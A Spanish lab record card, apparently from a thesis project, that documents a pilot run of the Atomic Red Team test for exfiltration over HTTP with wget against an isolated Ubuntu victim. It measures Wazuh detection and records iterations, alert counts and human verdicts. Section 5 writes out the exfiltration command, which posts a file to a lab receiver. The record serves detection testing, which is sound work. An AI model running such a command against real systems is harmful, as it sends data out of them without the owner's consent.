---
fase: 3
bloque: fase-03-piloto
ata_id: ATA008
tecnica: T1048.002
tactica: Exfiltration
version: 2
status: review
fecha: 2026-09-25
---

# Ficha — ATA008 · T1048 Exfiltration Over Alternative Protocol (`wget`) (Linux / `victima-linux`)

> Piloto `fase-03-piloto`. Generada por `tfg-executor`. **Sin secretos.**
> Estado **`review`**: las **7 `dudosa`** quedaron **resueltas** por veredicto humano en bloque
> (2026-09-25, **`ruido`**), pero el **chequeo de sanidad** del criterio de doble iteración (§6 del
> plan) **falla** por el `ruido_conocido` (62 vs 119): es **variabilidad del churn de arranque** entre
> las dos iteraciones, el **mismo hallazgo** ya declarado en ATA002, no un fallo de la maquinaria.
> Los **3 criterios formales** del §6 **pasan**.

## 1. Identificación

| Campo | Valor |
|---|---|
| ATA | **ATA008** |
| Técnica / subtécnica | **T1048.002** Exfiltration Over Alternative Protocol |
| Táctica | Exfiltration |
| Sistema | Linux (`victima-linux`, Ubuntu Server 24.04.5 LTS) |
| Prioridad | n/d (no definida en el corpus; ATA008 es de la primera tanda de 13) |

## 2. Fuente del ataque

| Campo | Valor |
|---|---|
| Prueba ART | *Exfiltrate data in a file over HTTPS using wget* |
| GUID | `7ccdfcfa-6707-46bc-b812-007ab6ff951c` |
| Path en el clon | `atomics/T1048.002/T1048.002.yaml` |
| Commit pin | `388942adbd9641f4dfdcf079d7efe9a75ec0ac43` |
| Herramienta | `wget` — **GNU Wget 1.21.4** (`/usr/bin/wget`) |
| Dependencias | ninguna nueva — `which dd python3 wget curl` OK; `wget` elegida en el paso 0 |
| Elevación | **no** (usuario `angel`) |

Artefacto: `Dataset/Ataques/Comandos/T1048-Exfiltration_Over_Alternative_Protocol/ATA008_ataque.sh`
(`sha256=aa6eff0d613cf00a0668635c7182659ad13e1462d0ef45362e8551f890a7d32e`, idéntico en repo y en la víctima).
Evidencia de salida: `…/src/artifact`
(`sha256=188e4c90d05c7fa59bdca910c7659b87d04a78d41ea1ba65dd134583901f43e4`).
Señales esperadas: `.../ATA008_esperado.csv` (`sha256=6adb1cca735aa125792eae73768884779c97a1b4a989dc93dd179fba1d0f7e57`).

> **Trazabilidad de la validación humana (CA5):** los 3 `esperado` fueron validados por el humano el
> **2026-09-25**, y queda registrado en `plan.md` (frontmatter `gate`) y en el **comentario de cabecera
> de cada `ATA<NNN>_esperado.csv`**. El comentario de este CSV y del `README.md` se reescribió de
> «gate humano pendiente» a **«validado el 2026-09-25»**. Al cambiar el CSV cambió su `sha256`, por lo
> que se **regeneraron los 6 `-Audited.csv`** (con `--revision`) para refrescar el `sha256` del
> esperado en su cabecera; la salida sigue siendo **determinista** (mismo `sha256` en dos pasadas).
> Los `-Revision.csv` (veredictos humanos) **no** se modificaron.

> **Desviación del runbook (menor):** el runbook §2 paso 3 muestra `scp -r …/T1048.002 …/ATA008/`
> (dejaría `ATA008/T1048.002/src/artifact`). Se copió **`…/T1048.002/src` → `ATA008/`** para dejar
> `…/ATA008/src/artifact`, que es lo que espera `ATA008_ataque.sh` (y lo que declara el README §5.2).

## 3. Snapshot

- Víctima revertida a **`lab-listo`** antes de cada iteración (revert iter1 `2026-09-25T20:52:56Z`,
  iter2 `2026-09-25T20:57:41Z`). Entre iteraciones el revert es obligatorio.
- **Manager NO revertido**. **NAT desconectado** (no reconectado). No se instaló nada en la víctima.
- **Receptor en el HOST/sobremesa** (`http://192.168.65.1:9090/`, `Soporte/Ataques/receiver/sink_http.py`),
  arrancado **antes de `t0`** y **parado tras `t1`** en cada iteración. Regla de firewall
  `TFG-sink-9090` presente durante el piloto; **retirada al cerrar** (2026-09-26, ausencia verificada).

## 4. Iteraciones

| Iter | t0 (UTC) | t1 (UTC) | Duración | sha256 `ATA008_ataque.sh` | revert (UTC) |
|---|---|---|---|---|---|
| 1 | `2026-09-25T20:54:48Z` | `2026-09-25T20:55:27Z` | 39 s | `aa6eff0d…a7d32e` | `2026-09-25T20:52:56Z` |
| 2 | `2026-09-25T20:58:50Z` | `2026-09-25T20:59:31Z` | 41 s | `aa6eff0d…a7d32e` | `2026-09-25T20:57:41Z` |

`t0 < t1` en ambas (ventana `[t0,t1]` inclusiva). Reloj víctima↔manager < 1 s.

## 5. Comando ejecutado (literal)

```bash
cd /home/angel/lab-attack/ATA008
bash ATA008_ataque.sh
```

Cuerpo (atómica parametrizada, sin elevación):
`wget --post-file="$HOME/lab-attack/ATA008/src/artifact" --timeout=5 --no-check-certificate http://192.168.65.1:9090/ --delete-after`.
`stdout`+`stderr` en `ejecucion.out` (rc=0 en ambas).

## 6. Evidencia

`Dataset/Ataques/Resultados/Wazuh/linux/Logs/ATA008_iter{1,2}/`:
`times.log`, `ejecucion.out`, `ps_antes.txt`, `ps_despues.txt`, `deps.txt`, `sha256_artefacto.txt`,
**`sink.log`**.

**`sink.log` (prueba primaria de la exfiltración, idéntica en ambas):**
`POST / from=192.168.65.129 len=11 sha256=188e4c90…f43e content_type=application/x-www-form-urlencoded`
→ el `sha256` del cuerpo **coincide** con el del `artifact` de la atómica. El `POST` salió de la víctima.

## 7. Ventana extraída

- Fichero diario (NO `alerts.json`): `/var/ossec/logs/alerts/2026/Sep/ossec-alerts-25.json`.
- **Aislamiento por agente:** extracción `--detail` → `_raw` y filtro a `agent_name == victima-linux`
  (snippet corregido del runbook, ver ATA002 §10.2). El `_raw` conserva filas del manager para verificar.

| Iter | Filas en ventana (`_raw`) | victima-linux | wazuh-server (descartadas) | Detalle final | rule_id distintos | UNKNOWN |
|---|---|---|---|---|---|---|
| 1 | 674 | 666 | 8 | **666** | 8 | **0** |
| 2 | 731 | 724 | 7 | **724** | 9 | **0** |

Reparto por capa RS (Detalle): iter1 `RS2=663, RS1=3`; iter2 `RS2=720, RS1=4`. RS3/RS4 vacías. **0 filas de otro agente** (CA11 ✔).

## 8. Resultado (conteos por categoría, con veredicto humano ya plegado)

| Iter | filas | deteccion | auto_ruido | ruido_conocido | dudosa |
|---|---|---|---|---|---|
| 1 | 666 | **2** | 602 | 62 | **0** |
| 2 | 724 | **2** | 603 | 119 | **0** |

**`deteccion` (idénticas en ambas, todas `audit_exe=/usr/bin/wget`, RS2):**
`80792` — *Audit: Command: /usr/bin/wget.* (`execve` de `wget`, coincide con la señal `T1048-S1`);
`80791` — *Audit: Deleted: index.html.tmp.* (borrado del temporal que crea `wget`). → **Wazuh detecta
la exfiltración** por las reglas de auditd de fábrica (RS2).

**Nota:** la `deteccion` es **2 en cada iter** (no más) porque solo hay un `execve` de `wget` y un
borrado; el **resto** de la evidencia de la exfiltración es el `sink.log` del HOST (la red no es
visible para el HIDS de host sin reglas de exfiltración).

**`dudosa` resueltas (7):** iter1 3 (`5501`, `5715`, `5502`), iter2 4 (`5715`, `5501`, `5502`, `5502`).
Todas `motivo=sin_campos` (la única señal esperada es `audit_exe=wget`; no tienen campos `audit.*`).
**Veredicto humano (bloque, 2026-09-25): `ruido`** → `revision=resuelta`, `veredicto_humano=ruido`
(nota: *«criterio fijado por el humano el 2026-09-25 (sesiones del operador, ajenas al ataque)»*).

## 9. Doble iteración (§6) — veredicto `review`

| Criterio | Resultado |
|---|---|
| 1) Mismo conjunto de `rule_id` con `deteccion` | ✅ `{80791,80792}` == `{80791,80792}` |
| 2) `\|n2−n1\| ≤ max(2, 10 %·n1)` | ✅ `\|2−2\| = 0 ≤ 2` |
| 3) Sin `dudosa` sin resolver | ✅ 0 y 0 (7 resueltas por el humano) |
| **Sanidad** `auto_ruido` (≤ 10 %) | ✅ 602 vs 603 → `Δ=1 ≤ 60,2` |
| **Sanidad** `ruido_conocido` (≤ 10 %) | ❌ **62 vs 119 → `Δ=57` (≫ 6,2)** |

Los **3 criterios formales pasan**, pero el **chequeo de sanidad de `ruido_conocido` falla de forma
clara** → por §6 **`review`** (no se cierra en silencio).

**Por qué, con números (hallazgo):** la diferencia **no** viene del ataque (la `deteccion` es
**idéntica**: 2 y 2, mismo conjunto de reglas, mismo `audit_exe`). Es **variabilidad del churn de
arranque** tras el revert a `lab-listo`: los `ruido_conocido` son en su mayoría `execve`/`watch` de
utilidades de sistema que se disparan al rearrancar servicios. Es el **mismo hallazgo que en ATA002**
(allí `ruido_conocido` 404 vs 125). → **Traslado al escalado:** (a) esperar a que el arranque se
asiente antes de `t0`, y/o (b) usar un margen mayor / comparar solo el rango temporal de régimen.

## 10. Dudosas ATA008 — RESUELTAS ✔

Todas con `motivo=sin_campos` (la única señal esperada es `audit_exe=wget`; estas filas **no**
tienen campos `audit.*`, así que ninguna señal es evaluable → `dudosa` por diseño del filtro).

| Iter | timestamp_utc | rule_id | descripción | correlación |
|---|---|---|---|---|
| 1 | `2026-09-25T20:54:48.017Z` | 5501 | PAM: Login session opened. | sesión SSH del operador (t0/ataque) |
| 1 | `2026-09-25T20:54:48.017Z` | 5715 | sshd: authentication success. | sesión SSH del operador (t0/ataque) |
| 1 | `2026-09-25T20:54:49.933Z` | 5502 | PAM: Login session closed. | cierre de esa sesión SSH |
| 2 | `2026-09-25T20:58:51.259Z` | 5715 | sshd: authentication success. | sesión SSH del operador (t0/ataque) |
| 2 | `2026-09-25T20:58:51.261Z` | 5501 | PAM: Login session opened. | sesión SSH del operador (t0/ataque) |
| 2 | `2026-09-25T20:58:51.274Z` | 5502 | PAM: Login session closed. | cierre de esa sesión SSH |
| 2 | `2026-09-25T20:59:01.244Z` | 5502 | PAM: Login session closed. | cierre de la sesión SSH de `t1` |

**Veredicto humano (2026-09-25): las 7 = `ruido`** — son eventos PAM/sshd de **las propias sesiones
SSH del operador** (desde el sobremesa) usadas para lanzar/medir el ataque; caen en los segundos de
`t0` y de `t1`, **no** tienen relación con T1048 y no tocan ni el proceso `wget` ni el artefacto.
Criterio **fijado por el humano** (en bloque) y aplicado con nota honesta en los `-Revision.csv`.

## 11. Limitaciones y cabos descubiertos

1. **`sin_campos` estructural (hallazgo del piloto):** con una señal única por proceso
   (`audit_exe`), **cualquier** alerta sin campos `audit.*` (PAM, sshd, syscheck) cae en `dudosa`.
   Las **sesiones SSH del operador** (PAM/sshd) no tienen esos campos → **cada ataque genera dudosas
   sistemáticas**. Mejora para el escalado (anotada, **no** arreglada en el piloto): reconocer y
   excluir las sesiones del operador (o reordenar el criterio) para no acumular filas a revisar.
2. **`scp` del runbook** (ver §2): copiar `T1048.002/src`, no `T1048.002/`.
3. **Receptor forzado a parar** (`Stop-Process`): el `sink.log` **no** lleva la línea final
   `# sink_http detenido`; el arranque y el `POST` sí están.
4. El `wget` guarda el cuerpo de la respuesta del receptor como `index.html.tmp` y lo borra
   (`--delete-after`), lo que genera la `deteccion` `80791`; es ruido del propio `wget`, no del ataque
   en sí, pero confirma el `execve`.
5. **Sanidad de `ruido_conocido` sensible al arranque** (§9): ver hallazgo (común a ATA002).
